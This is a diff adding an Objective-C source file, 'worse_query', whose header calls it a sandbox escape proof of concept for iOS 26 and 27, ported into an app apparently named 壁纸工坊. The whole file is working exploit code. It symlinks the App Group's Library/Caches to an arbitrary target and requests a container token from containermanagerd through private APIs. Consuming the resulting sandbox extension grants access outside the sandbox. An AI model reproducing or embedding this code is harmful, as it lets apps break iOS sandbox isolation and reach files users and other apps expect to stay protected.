@@ -1,0 +1,221 @@
+/*
+     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
+     Copyright (C) 2026 Taj C (forcequit)
+
+     This program is free software: you can redistribute it and/or modify
+     it under the terms of the GNU General Public License as published by
+     the Free Software Foundation, either version 3 of the License, or
+     (at your option) any later version.
+
+     This program is distributed in the hope that it will be useful,
+     but WITHOUT ANY WARRANTY; without even the implied warranty of
+     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+     GNU General Public License for more details.
+
+     You should have received a copy of the GNU General Public License
+     along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+     Ported into 壁纸工坊, adapted by 壁纸工坊.
+     Based on Placard's bundled worse_query.m (the safer variant that backs
+     up Library/Caches and restores it after the query).
+     Changes from Placard's version:
+       - The backup prefix is ".bizhigongfang-cache-" so the app's Swift
+         startup recovery can find leftovers.
+       - query_unlocked was refactored into query_unlocked_at_root, which
+         takes the App Group root as a parameter; worse_query resolves it
+         via NSFileManager, worse_query_at_root uses the caller's root.
+*/
+
+#import <Foundation/Foundation.h>
+#include <dlfcn.h>
+#include <stdlib.h>
+#include <xpc/xpc.h>
+#include <sys/stat.h>
+#include <errno.h>
+#import "WorseQuery.h"
+
+typedef void *(*container_query_create_fn)(void);
+typedef void (*container_query_set_class_fn)(void *, uint64_t);
+typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
+typedef void (*container_query_set_flags_fn)(void *, uint64_t);
+typedef void (*container_query_set_part_fn)(void *, uint64_t);
+typedef void *(*container_query_get_single_result_fn)(void *);
+typedef void (*container_query_free_fn)(void *);
+typedef char *(*container_copy_sandbox_token_fn)(void *);
+typedef int64_t (*sandbox_extension_consume_fn)(const char *);
+typedef int (*sandbox_extension_release_fn)(int64_t);
+
+// Move the cache aside without deleting its contents, and restore it after use.
+static BOOL restore_cache(NSString *caches, NSString *backup, struct stat installed) {
+    NSFileManager *files = NSFileManager.defaultManager;
+    struct stat current;
+    if (lstat(caches.fileSystemRepresentation, &current) == 0) {
+        if (!S_ISLNK(current.st_mode) || current.st_dev != installed.st_dev ||
+            current.st_ino != installed.st_ino) return NO;
+        if (![files removeItemAtPath:caches error:nil]) return NO;
+    } else if (errno != ENOENT) {
+        return NO;
+    }
+    if (backup) return [files moveItemAtPath:backup toPath:caches error:nil];
+    return [files createDirectoryAtPath:caches withIntermediateDirectories:NO attributes:nil error:nil];
+}
+
+// Both entry points share this lock: only one query may run at a time,
+// because they all swap the same Library/Caches path.
+static NSLock *worse_query_lock(void) {
+    static NSLock *lock;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{ lock = [NSLock new]; });
+    return lock;
+}
+
+static int64_t query_unlocked_at_root(NSString *target, NSString *group, NSString *groupRootPath, bool alt_flags, bool create_dir) {
+    // Check if the target exists
+    if (!create_dir) {
+        struct stat st;
+        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255; // Nothing exists at this path, and create_dir is false
+    }
+
+    // The App Group root is supplied by the caller (resolved via
+    // NSFileManager, or probed from an unused token under LiveContainer).
+    // An App Group identifier you control is required for this
+    if (!groupRootPath) return -1; // App Group doesn't exist or we can't access it
+    NSString *caches = [groupRootPath stringByAppendingPathComponent:@"Library/Caches"];
+    NSFileManager *files = [NSFileManager defaultManager];
+
+    // Resolve functions
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) return -2; // dlopen failed?
+
+    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
+    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
+    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
+    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
+    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
+    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
+    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
+    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
+    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
+        dlclose(mgr);
+        return -2; // Failed to resolve a function (unsupported OS)
+    }
+
+    // Create query
+    void *query = query_create();
+    if (!query) {
+        dlclose(mgr);
+        return -3; // Failed to create query
+    }
+
+    // Set up query
+    xpc_object_t identifier;
+    query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
+    identifier = xpc_string_create(group.UTF8String);
+    query_set_group_identifiers(query, identifier);
+    query_set_part(query, 3); // The query's part sets our base path, part 3 is Library/Caches
+    if (alt_flags) {
+        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
+    } else {
+        query_set_flags(query, 0x0000008000000000ULL);
+    }
+
+    NSString *library = [caches stringByDeletingLastPathComponent];
+    if (![files createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil]) {
+        query_free(query);
+        dlclose(mgr);
+        return -4;
+    }
+    NSString *backup = nil;
+    struct stat original;
+    if (lstat(caches.fileSystemRepresentation, &original) == 0) {
+        backup = [library stringByAppendingPathComponent:
+                  [@".bizhigongfang-cache-" stringByAppendingString:NSUUID.UUID.UUIDString]];
+        if (![files moveItemAtPath:caches toPath:backup error:nil]) {
+            query_free(query);
+            dlclose(mgr);
+            return -4;
+        }
+    } else if (errno != ENOENT) {
+        query_free(query);
+        dlclose(mgr);
+        return -4;
+    }
+    if (![files createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
+        if (backup) [files moveItemAtPath:backup toPath:caches error:nil];
+        query_free(query);
+        dlclose(mgr);
+        return -4;
+    }
+    struct stat installed;
+    if (lstat(caches.fileSystemRepresentation, &installed) != 0 || !S_ISLNK(installed.st_mode)) {
+        // Keep the saved original if another process changed the cache path.
+        query_free(query);
+        dlclose(mgr);
+        return -4;
+    }
+
+    // Send our query over
+    void *result = query_get_single_result(query);
+    if (!result) {
+        query_free(query);
+        dlclose(mgr);
+        if (!restore_cache(caches, backup, installed)) return -4;
+        return -5; // Query rejected by containermanagerd
+    }
+    char *token = copy_sandbox_token(result);
+    if (!token) {
+        query_free(query);
+        dlclose(mgr);
+        if (!restore_cache(caches, backup, installed)) return -4;
+        return -6; // Kernel refused to issue a sandbox extension
+    }
+
+    // Consume sandbox extension and clean up
+    int64_t handle = consume_extension(token);
+    query_free(query);
+    free(token);
+    dlclose(mgr);
+    if (!restore_cache(caches, backup, installed)) {
+        worse_query_release(handle);
+        return -4;
+    }
+
+    return handle;
+}
+
+int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
+    NSLock *lock = worse_query_lock();
+    [lock lock];
+    @try {
+        NSFileManager *files = [NSFileManager defaultManager];
+        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
+        if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
+        return query_unlocked_at_root(target, group, groupRoot.path, alt_flags, create_dir);
+    }
+    @finally { [lock unlock]; }
+}
+
+int64_t worse_query_at_root(NSString *target, NSString *group, NSString *groupRoot, bool alt_flags, bool create_dir) {
+    NSLock *lock = worse_query_lock();
+    [lock lock];
+    @try {
+        NSString *root = groupRoot;
+        if (!root) {
+            // Caller passed nil: fall back to the NSFileManager root.
+            NSFileManager *files = [NSFileManager defaultManager];
+            NSURL *resolved = [files containerURLForSecurityApplicationGroupIdentifier:group];
+            if (!resolved) return -1; // App Group doesn't exist or we can't access it
+            root = resolved.path;
+        }
+        return query_unlocked_at_root(target, group, root, alt_flags, create_dir);
+    }
+    @finally { [lock unlock]; }
+}
+
+// You should probably call this when you're done
+void worse_query_release(int64_t handle) {
+    if (handle < 0) return;
+    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
+    if (release_extension) release_extension(handle);
+}
